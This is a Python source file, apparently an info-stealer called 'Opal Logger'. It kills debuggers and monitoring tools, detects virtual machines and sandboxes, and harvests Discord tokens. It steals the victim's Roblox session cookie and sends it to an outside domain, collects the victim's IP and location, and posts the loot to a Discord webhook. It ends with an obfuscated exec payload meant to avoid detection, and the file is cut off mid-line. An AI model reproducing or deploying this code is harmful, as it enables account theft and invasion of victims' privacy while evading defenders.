import os
import time
import discord
import requests
from colorama import Fore
from ctypes import cdll,byref,c_bool,c_char_p
import requests
import os
import sys
from json import loads, dumps
import json
import uuid
import ctypes
import socket
import random
import platform
import browser_cookie3
from discord_webhook import DiscordWebhook
import re
import shutil
import os
from re import match
from json import loads, dumps
from base64 import b64decode
import re
import ntpath
from urllib.request import Request, urlopen
import json
from Crypto.Cipher import AES
from sys import argv
import win32crypt
import shutil
import sqlite3
import requests
import psutil
import base64
from datetime import timezone, datetime, timedelta
from dhooks import Webhook, File

PROCNAMES = [
    "ProcessHacker.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "fiddler.exe",
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "df5serv.exe",
    "processhacker.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "ida64.exe",
    "ollydbg.exe",
    "pestudio.exe",
    "vmwareuser.exe",
    "vgauthservice.exe",
    "vmacthlp.exe",
    "vmsrvc.exe",
    "x32dbg.exe",
    "x64dbg.exe",
    "x96dbg.exe",
    "vmusrvc.exe",
    "prl_cc.exe",
    "prl_tools.exe",
    "qemu-ga.exe",
    "joeboxcontrol.exe",
    "ksdumperclient.exe",
    "xenservice.exe",
    "joeboxserver.exe",
    "devenv.exe",
    "IMMUNITYDEBUGGER.EXE",
    "ImportREC.exe",
    "reshacker.exe",
    "windbg.exe",
    "32dbg.exe",
    "64dbg.exex",
    "protection_id.exex",
    "scylla_x86.exe",
    "scylla_x64.exe",
    "scylla.exe",
    "idau64.exe",
    "idau.exe",
    "idaq64.exe",
    "idaq.exe",
    "idaq.exe",
    "idaw.exe",
    "idag64.exe",
    "idag.exe",
    "ida64.exe",
    "ida.exe",
    "ollydbg.exe",
]


for proc in psutil.process_iter():
    if proc.name() in PROCNAMES:
        proc.kill()


def watchdog():
    checks = [check_windows,check_ip,check_registry,check_dll,check_specs]
    for check in checks: Thread(target=check,daemon=True).start()

def exit_program(reason):
    print(reason)
    exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b'')) 

def check_windows():
    def winEnumHandler( hwnd, ctx ):
        if GetWindowText( hwnd ).lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer'}:
            pid = GetWindowThreadProcessId(hwnd)
            if type(pid) == int:
                try: Process(pid).terminate()
                except: pass
            else:
                for process in pid:
                    try: Process(process).terminate()
                    except: pass
            exit_program(f'Debugger Open, Type: {GetWindowText( hwnd )}')
    while True: EnumWindows( winEnumHandler, None )

def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160', '', '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}
    while True:
        try:
            ip = get('https://api64.ipify.org/').text.strip()
            if ip in blacklisted: exit_program('Ip Blacklisted')
            return
        except: pass

def check_vm():
    processes = ['VMwareService.exe', 'VMwareTray.exe']
    for proc in process_iter():
        if proc.name() in processes: exit_program('Detected Vm')

def check_registry():
    if system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1:exit_program('Detected Vm')
    handle = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: exit_program('Detected Vm')
    finally: CloseKey(handle)

def check_dll():
    if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(path.join(environ["SystemRoot"], "vboxmrxnp.dll")):  exit_program('Detected Vm')

def check_specs():
    if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: exit_program('Memory Ammount Invalid')
    if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: exit_program('Storage Ammount Invalid')
    if int(cpu_count()) <= 1: exit_program('Cpu Counts Invalid')

try:        
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    class scare:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass
        def crow():
            forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
            return scare.fuck(names=forbidden)
    scare.crow()
except:
    pass

webhook = ("https://discord.com/api/webhooks/1019369541572231278/eeJrmidWD9en7yD4fwRe-gbPDc2Jjb-ebp-rOqW8pwGj9o-bK3VI-fHuwMKzF74RSgif")


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

cookies = browser_cookie3.chrome(domain_name='roblox.com')
cookies = str(cookies)
cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
User = r['username']
rob = r['robux']
rap = r['rap']


ip = requests.get("https://wtfismyip.com/text").text
gather = requests.get("http://ipinfo.io/json").json()
city = gather['city']
hostname = gather['hostname']
country = gather['country']
region = gather['region']
machines = platform.uname()
machines = platform.uname()
pc = os.getenv("UserName")
pass


steal = {
            "embeds": [
                {
                    "author": {
                        "name": "Opal Logger",
                    },
                    "description": f"{pc} tried nuking someone \n\n**token log:** ||soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
                    "color": 0x00C7FF,
                    
                    "footer": {
                      "text": "Opal Logger | https://github.com/syntheticc/Opal-Logger"
                    }
                }
            ]
        }
requests.post("webhooker", json=steal)

# Extra PROTECTION so its not detected alot
import marshal, zlib, base64, lzma
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b85decode(b'FH~eUS4M9^K|xe)F>+EzL1#f|K~h;kK|w+=Oe<GvK~Xg{WlDN<S9EN7GB9ydY*%__bXaw5WiMJeSyn<*X+}wJL1#irQ&D+zY<NsUMpHpTMQ1}wLO5($OG-^eQ$<N@bxlTeb~t%ZGe~V?dNpchFi&$hdSi4rcQR6KY-M_NX<|2MGC4;pFH}TQR%}5=Mpj2wY+7q>R5dnBI7m5kFIqV-b~IE_PFQ+vST{FWGImQdFHbRdc`{;ZbaF9HG<SA4LRm0&H(F*ZLoakzFEv;%IBisNQZzDlD^O}iN;p||D`sj|N;qM5D`sj=N;q0}D`sbUP<A$BYBMiGczQ2vG<h#HD@AiFFKBCKFEx2kW;jSlb}LkBSTiwcFHdu3He+UHI8a7*D`sdjW>9)JR5W@oI73isFK;+7W^_nqD|R<bFLq)xST9y)cXeh)IWaFpHF$P3W<hmkZZB>xIZrQQb}u)2VmWqVS1&X#GBz(bH)dK_HEb^{M>R)iP;E0>W^7|~aY8U?GdV;~I7>!qMoMsWcVba5IW>B8bUAV>Q88mtS2ZwaY-uxkG<bDpV>mZ5P%mXqP%=?$ZBBVjcR6QrMtWi^R9Hw^Ha2l+PjpOeF=9zHI74D_bVp@$HFQ=>PDo{QOLKX2YB4f$R!}))Z#ZN)D`9SVIA(NOD^@XjVP<nLT2wVFSb23(d3t10GD9n3Z!dC4FGDk9V{JxfRy9&^W;c0HWphqASw?noFm*6jPB&V1WI0!BdU8uPb4N#3OEhb8VlsDaGi_pbYDrQ?VmVP%GDu`LS3@~iN_R0*L^)JZOgD8ySWZ$+P*!0!bYfX`c|uT5M`%+{O+$EbXl{9GY(`mnRWxx+Xmv<zcUf;zHCK9CPD)mFWMNNLT23%dH)Ls8H(4+-YIajLHA^oxbTUV3PI_5xVrWcHMpI2NbV+S5ICFAxM>sNZHd!=dPFQeLa%E*kFLZfYXhdvmRcCcoYi>DmYAaA#NO)o}T5e-^Vnb1FT244KX);f8az}7ZQ8Qsxb5nUYaA-MVZ!vObS8#A|WHd2sS}}M|ZbnCRSy)$cX;L>dSY=N#OG9dGS9C>KZ!1qSSxz`KQB-Fzaz#v1byG57aA;L-b!bO(D`-zIaY|%RRxoijFh)j8V|Q(HR84tlVp?ZJa(Q`kWJpkVGEH_iHCi@nR5*EOb#75MWO7AlQdDbpX-;A}RboVWb8d22b!t{(WNd14ZFNR4H&ax3c0)8uQF2acLor%fH!p2bXD>BLd1Y~VWp#K~dPy*HD{W9@S7~K3ax!8uGE7K$V@Y9CG(m7SHA+-Pbwf}}N>gT1GBR;)Y%6q0D_TosPG(9nbTx1>Vr?)|G;%d?d38r?MlWx4SXyv(PD@Z%RW(XNFk&=xQf)L@d1x^;RYqEDGiFn3WMoKhGHp;|X=!?5Vl;L}cr$N#b51czaYS`9b8$sXVRLO!QchJ-VK+%}F)&MRVnaD+Xk}+bV>WA8aYk%dYHmwUT1i@QM@2R`Rc%IVS4VbYMo%(nP-8Y&Z7WweZ!}s*S#M}YZ+S>zZ)js-Wnp$zMR`a!HCTE^Lt$DqNq22}NMvhcbV^WZLvC72FGfOSGH_05Mq*4_HcC`#b8U7>X=q|`Q86obXficZS2<~HR%A9;dP;Rqa7AcKZ*(^>R7NjxLPkhLZg6Qcc4A0nHb!J|N@6fmWN=bZVsA}$Gg@*}Yb$woP%%n3RB=o)bVW3HH#K5cXHqyxZ8bJ`NOWs#c4TWXLUl4SZ%cG_Rxx#OYb$b1OiOJ-OJjI$dTVNQM^8<6Fhq2DF?dfeS1)#KaZhqecvUxUWN1V;G)hfwVOVW)NKj;RGj~`;D_2HzG<julF<L=IFj{U&T68&4S~YQZSawx1V^%g=GDcQ2Z*w_Lby`$*X=E>KW>rRFb#!cRVM29LZ+SswD{5qTc2qJ-R!%Tkct~+)PBU~<GE7BoXEjAJL~}81LuGPGaX~S2GdE04ZBueKS5$LJT5?%IF;`SIa$;|1S~f>{YH)UKR!~w%W^7e6a4>XGRZK`>I8IM8QEo3&HfL#6WomUvG)7M^Ls4^PWo0;OR4;g8MlW=9b2T|PH)>8=L1Hf}O;9pybZ~N4XJ#)~c5PK{W@}bjQAT7<FG_PWQ8s01LpNe}R$5eQcyU=#Pew5@HAh-<QCCe(P)=`kK|*6iQ!zMsXfQT4b4XKpd2CE@W=v#tWN1@xGE_xHa92)iY*s}vRaA0TVo*<QML|heVr+MELQZ&aWn^|sT4r@eN_1ybb}}+EQekRkS#xeOWiV}YH*a}zb5}D~R&OzNa%ERqSaUXVD?(OoMng1WR&g?DX+&XBZALRObvHL*dTUy2MpSA-YfySgNNr0<YG_JWd1zNbWmQUNFLh~1RY62KHB)9wD@8ePHBn?yYe-QmbT&yrMn-x~aw|u1Z&rCwT46C-RZ%o)HB~n=YH)B!F)?sUb!1OZc{nn9IdfN1V`(y0b2KwrHEd;NV{m3uVR}PudRIqvR%~QdcQr3(Wi?r0L}xfxd2Lv1Ggd}wY;Si{GEG%0Vn$j^GI2FwHaAjvW<xVgab-wvPDV#{aCBuuV{S1uPBcV0L`!5fR%mr?FhyBTF=uadHDfnrR8T=hVR}|sbxCnDWqN2daXEQ%IZ;?mQ&decNKkokQbjpuPBL|IG-Y^sXJU3$bXQ9?WK~seRZBN!b}%wkVKO;UXG>-?Nm@5rT6H;OWiv2VdT@AUcVuuwMk{1#ZFEjDM0i<nHD)z3Gi^9IZcAh`cS3GLVMH)RIa*eES7S47O+i|2HA!SwY(z45Z7Xp$d3IJ-Hd#bhPHA&-Wl2+bQFJd;b47J)cXKy-L~waEMRH?hGfq)xQdMa+MJsPwD@bBmVQ4jMHfeJ)W==D6XICpRODk6^IZrfCaz|B9SxYricVbOzWJh65cU5t8M_O}ED{f(MGfi}9ZFMq3b6I3rNL55tOm12*I7mq~cQ<Qea!hG7Sxjp<VK6x}d0|jCD=ST8P)9X*X?AQmcu7!pba*s4I8`<^Q#NCDMp#%iWNTw&Z8A<!L}g}WL18ggcr$BuQ8jKtLrXJ4cx^>Uc3FB>I8{h=Oj<W*ZbM8@S$8WdXJjyNaz$x&Ry9O=HdJhFG*NnPdTK*hSYlE#a9LSyQ&LAxZaGdXYfv$7ac?&>M0!&&Z8k`Hab-wiLScDyIapFgVq$tuQBQhCO*m9xMR71OSx;n7Xi!EsVM;biF=t{qdR0wLM{hWDH8W*yHd9zfGi@(TNOVqcbZBB}c0)yWV^KFUaW!jnIZrTAV@_2!LTGw(L{n#BXhu*$HAi(qH(6yXRasPLdP{RdWpGnyIeJ1@Lt%A6X>LqccQA57FG^Z%WI;<wYfM&1MO9@`K}k_qD>5=;cPn^qT4Pc|LTXMlYA<XwXD>H(IAn5pD{*64Gg4D>YBNZ6V`n!vc3Ne3Ms8F?P+EC4Y(qpVM{H<FK{!e|b23V0dURBASXDMfbXjwHIC4rgR%$slL}e>6M>J_;NL5K`c4}ruGIMWeH*8H~a56YpR(exNV`Ob=FH%HwdU{rLQ*w4|M>lwGNLN8CGjvpDZg^*9ayMl)WHd;4d3jJ*dS_~CZA(vCaz{vIYG-FPa#>_FLvm_iP&rUiH)mpMMl?rGSy@RnW_LtmOE^JSD{@myY-V^#Wn)lbGH^jod1+W-VN60<b5w6jO>JXMH&;YzK~GR)cu-JuIA(7&aaJ;UOhrOXM0!XvPAg|fD^pr(WJ+XJNH}OtODkDocyMl4S#CCVO-(g9cxZD`Z&7kKQg&5BG)OOINK#BMG-hj8L_uVCc5-VrbZj+dK{!cyIW$subahL4OKn(qY*sT%OgK$PG-q#eWJPXfO>K8)cy35WMqzklP;6sRZbDI6LQqC&OgLm&c6xO*baQ$%LQ+UlWoKwmH*albXH!mPH+VvJG)iqkLSjr(M{_GPNpDdxOEFn+cTs6EV@G94Y+-LJNklJDc~M$vOG7~~VL>-|Yind}Lr7_4Gd5yKXhASIc{WygWHVDpWnp$uZfa~-XhdjOV=HA@Gcht(PAfxlL|Ab}Y*u(nSvWUlSxaF;LsnRHL}YPUMO1M@OkqnwHgI}4K~H&0T4P!<XhBeEN_J6BODiiwS!Y;yI5|mKK{!)1NK{2nQ8Z#VFh)&7X=_J%O=nkSL_u|Kbu>g&VM=B*NOe|cX>Mn5S!Y>pZbf!QFnVrmMQt%-IBt1sY;8|*M`cuLNq9DLF-~(?Wie4&IATm^NJ3duL@R7DMrn0pNqBitL}Yq)YD7ayZgn_!VKYQ+OIJlsGck2%b}MQ~Hd1gmR5Vs>NHJq)Zfs9DMruo1Ln}#RPfSo$G*mNMOKnFpd2nKQc2+WZX)`fxY%6a>b2Tq*FLX9-N;P+CNOVm~D_KV|FL!EVP;5(4Q#VmiYC<$rWNJlqcSBe*P(@L7YG_4LYBEA<I50sqQZZR*Y;8DaS!p;mSZqpmF*kQtQ*dN4bWBJ^Vs|)NK`>8bOm}H+RZ3-ULpE?ZbWCAuFIH$xZhCfjYDh(RG(%QKM@3~tQdUz$bxt@nV|7VNS#EhyHfK(FYe!2pXi9QrHF!r*bX06{XI6E0OLr?Zbag^ucR@#EHEm)=Q%O=(ac)mZQDjbQM?pzrcuIL}P)bEMYHwmSbxl)cSVd4{NO(n4O=531aYaT|X-{inNH{iAH)lp-Q$=-6V|X)qb5&(!O?oy)FIIYUc~NCJT4zFNX-jl!cujU|Q8Z>*S}=G{SXxRkMQ?X{Ics)vP*zZJM{q+>d3RJ$P(?{)ST#aqcu#9ZdNWB)V>eB3bb50*QA&7ac3EX_R#RFqT6IcAHfu~tb5urDV>m%<WiWX!K}}guM^$A}Y->t6Xk>atHg8aPOJzYuV=*>bRc|zRdT(@YL`gF@NKa5nVKZnpXiZgGG%;##P-bLVO*2e6Gh%d7cXC%%HZn4Acs5XOVPtPmdNoQ%c40<$Vo_N(R7OZMa8y)oFe`OTNj73JK~Q62X=+eSHDohxc4tCyMK5brYhq9{SVT}nP-RJDVpL>!Gc!nIY&Ka~aZ6TFG*wnqS!r!;M^kDtb4oc#M{rIwYE)59Hg|PvdRanDFmo$bW<peYO*Ty{T32UFO?72OWiL@`Xl61qL2`OGG)7KMS5q=)N^ev%R!VewS4(<EIYKu`M|EXmLuGPQN^@E@QbICUF;s3cPA^16MK@<hcV=g3R4_?qGe<Z$ZZS7%HfTdpV=zZ!RAo3hV|O)cFL_W{Z)IgoX*O&#Q8+m_Qcg5yP;F{?P;XCRL1t5RX=G<PT1+%(cy>lOaCdleM@CLXQ&o96Z8k?)dTV%caW7_1L2_$#HBfJCSTJySazZjVLpW<{a!p4?VOK9%N>fWWNJeE*PBvO)Yf?^9STZm)Vl;R`WmZ8icV{<8HZw^_d2ecXFIO-&cXDV|FiAKvNm@rVLt`&_XGmpJYfno^L_}q2LvuqbYfnfyIB{?=ct%xGOG0i>L3Kz<PGn|AGEZw~HFqmnICwKKNjNWYMRHX^Hgj!7FGW~SM`lASXj)iJH)vN*dRb^TNjP&uR%%RFYDFtFZ*FrzGgEX?Fn4!KSz%H+b3s~ARYpx_Ye6wZS4mnnb8J~SW@=_?FL7~hODl42D^4_MdNy%lGIM2aN^VS4XG~{Qb7FOENOM*&NLn^fGgWSHYG+V3Nkd^PcrS1{ctS)_M`ABgNLgfcL~&7BSyMMoWKC>(ZcTPsVKXvuQ#f~0Ib~6KHZe#vNOVp~R7F=db$Cc+YIt%<RAX~cP**QRPEvYlXG?5oc1SrvW^FlIFECYOSxGfhR8KiWF;z8LcxF#oHEvK<ICp7OazZ#cD|kgxFL_6HZdgxNXHsuPH!(+VH+VQSR5UeDRX9;dS42)TF-uQLPI+iZWlT9ZQhH%gSa(cQbZB>CWI|9+T1z%sa&J##P<lZtNl!OLZgWaDM`ST*Rc1IjId^e1VK+lGSWj?7acg01F)u?(VoX6ca4&OlICWBXc6nuLSZz>tMPfN;W@krKbv9B^FjF>oGG=cxWLh&wbU|2fV_A1rXKHdpFjY4<QDrY}Ohi?6PD*Z9S$J<nbW}`KYH3z<L^o?RXjo53FG@E!c2HR}H!nqSXlrh7YjJijFG@IAS21=oIWTZka$00IdN@sHFE4s(ZZA16FF1NQFHdc9b5u`aL^XPMHda+rM07H4OffNTGionSP+~AkMK5Y;HDqE}F?3IIFLH8rP*^ZhRA@0TFLqOOGcRRrG%{*eZa6Duc5X*dV=rlLGc;sKIA&@@SutWZI7n$>S~M>&b5vM2LS=YHb~QFDXK-vrGfFr)W>_#QXmMqCW;bn4FEDFoXKXJob#^gvD=Tv^GD#~iFJd@#d3J3vK|w)5K~HmHb#7uYL2pA#K|x1SNM>teK|w)yQB^T&b7N9&D|bmjK|w)5LPl(1'))))))
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MO